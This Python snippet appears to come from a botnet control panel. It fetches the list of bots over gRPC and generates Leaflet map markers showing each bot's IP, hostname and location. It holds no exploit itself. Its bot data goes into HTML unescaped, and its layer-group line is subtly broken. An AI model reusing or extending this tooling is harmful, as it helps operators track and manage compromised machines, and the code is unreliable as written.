from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *

def get_bots(client):
    bots = []
    data = ""
    for b in client.GetGlobalBots(Empty()):
        bots.append(b)
    if len(bots) > 0:
        data += "var "
        c = 0
        for i in bots:
            if len(bots) == 1 or c == len(bots)-1:
                data += f'bot{c} = L.marker([{i.loc}]).addTo(map).bindPopup("<strong>&#129302 {i.bot_id}</strong><br>IP: {i.ip}<br>Host: {i.hostname}<br>Ciudad: {i.city}<br>Región: {i.region}<br>País: {i.country}");'
            else:
                data += f'bot{c} = L.marker([{i.loc}]).addTo(map).bindPopup("<strong>&#129302 {i.bot_id}</strong><br>IP: {i.ip}<br>Host: {i.hostname}<br>Ciudad: {i.city}<br>Región: {i.region}<br>País: {i.country}"),'
            c += 1
        a = []
        c = 0
        for i in bots:
            a.append(f"bot{c}")
            c += 1
        data += f'var bots = L.layerGroup({a});'
    return data